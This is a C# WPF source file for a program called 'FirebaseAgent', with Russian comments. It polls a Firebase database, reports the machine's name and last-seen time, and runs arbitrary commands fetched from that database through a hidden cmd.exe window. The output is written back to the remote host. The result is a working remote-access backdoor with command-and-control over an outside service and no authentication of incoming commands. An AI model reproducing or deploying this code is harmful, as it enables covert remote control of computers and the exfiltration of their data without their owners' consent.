using Firebase.Database;
using Firebase.Database.Query;
using System;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Windows;

namespace FirebaseAgent
{
    public partial class MainWindow : Window
    {
        private FirebaseClient firebase;
        private string machineName;
        private bool isRunning = true;

        public MainWindow()
        {
            InitializeComponent();
            firebase = new FirebaseClient("https://test-qstem-default-rtdb.firebaseio.com/");
            machineName = Environment.MachineName.ToLower(); // напр. desktop-qmempnk
            Task.Run(ListenForCommands);
        }

        private async Task ListenForCommands()
        {
            while (isRunning)
            {
                try
                {
                    // ПИНГУЕМ only lastSeen!
                    await firebase.Child("machines").Child(machineName).Child("lastSeen").PutAsync<string>(DateTime.UtcNow.ToString("o"));


                    // CHECK COMMAND
                    var command = await firebase.Child("machines").Child(machineName)
                        .Child("cmd").OnceSingleAsync<string>();
                    if (!string.IsNullOrEmpty(command))
                    {
                        string resultMessage = "";
                        try
                        {
                            if (command == "explorer")
                            {
                                Process.Start("explorer.exe");
                                resultMessage = "Проводник успешно открыт";
                            }
                            else if (command == "notepad")
                            {
                                Process.Start("notepad.exe");
                                resultMessage = "Блокнот успешно открыт";
                            }
                            else
                            {
                                var proc = new Process();
                                proc.StartInfo.FileName = "cmd.exe";
                                proc.StartInfo.Arguments = "/c " + command;
                                proc.StartInfo.RedirectStandardOutput = true;
                                proc.StartInfo.RedirectStandardError = true;
                                proc.StartInfo.UseShellExecute = false;
                                proc.StartInfo.CreateNoWindow = true;
                                proc.Start();
                                string output = await proc.StandardOutput.ReadToEndAsync();
                                string error = await proc.StandardError.ReadToEndAsync();
                                proc.WaitForExit();
                                resultMessage = string.IsNullOrWhiteSpace(output) ? error : output;
                            }
                        }
                        catch (Exception ex)
                        {
                            resultMessage = "Ошибка при выполнении: " + ex.Message;
                        }

                        // Пишем результат и ОЧИЩАЕМ КОМАНДУ!
                        await firebase.Child("machines").Child(machineName)
                            .Child("result").PutAsync<string>(resultMessage);
                        await firebase.Child("machines").Child(machineName)
                            .Child("cmd").PutAsync<string>("");

                        Dispatcher.Invoke(() => Title = "Agent ждёт команду...");
                    }

                    await Task.Delay(2000);
                }
                catch (Exception ex)
                {
                    await firebase.Child("machines").Child(machineName)
                        .Child("result").PutAsync<string>("Ошибка: " + ex.Message);
                    await Task.Delay(5000);
                }
            }
        }

        protected override void OnClosed(EventArgs e)
        {
            isRunning = false;
            base.OnClosed(e);
        }
    }
}
